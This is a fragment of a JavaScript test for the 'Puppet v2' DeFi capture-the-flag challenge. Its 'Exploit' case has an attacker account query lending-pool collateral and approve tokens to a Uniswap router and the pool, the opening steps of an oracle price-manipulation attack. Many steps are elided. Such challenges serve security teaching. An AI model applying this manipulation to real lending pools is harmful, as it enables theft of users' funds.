...
describe("[Challenge] Puppet v2", function () {
  ...
  before(async function () {
    ...
    //   "0x1a055690d9db80000",   // 30 ETH ==> modified because "max upfront cost" error
    ]);
  ...
  it("Exploit", async function () {
    let collateral = await this.lendingPool.calculateDepositOfWETHRequired(
      ethers.utils.parseEther("1")
    );
    ...
    let bigAmount = ethers.utils.parseEther("9999");
    await this.token
      .connect(attacker)
      .approve(this.uniswapRouter.address, bigAmount);
    ...
    collateral = await this.lendingPool.calculateDepositOfWETHRequired(
        poolBalance
    );
    ...
    await this.weth.connect(attacker).approve(this.lendingPool.address, poolBalance);
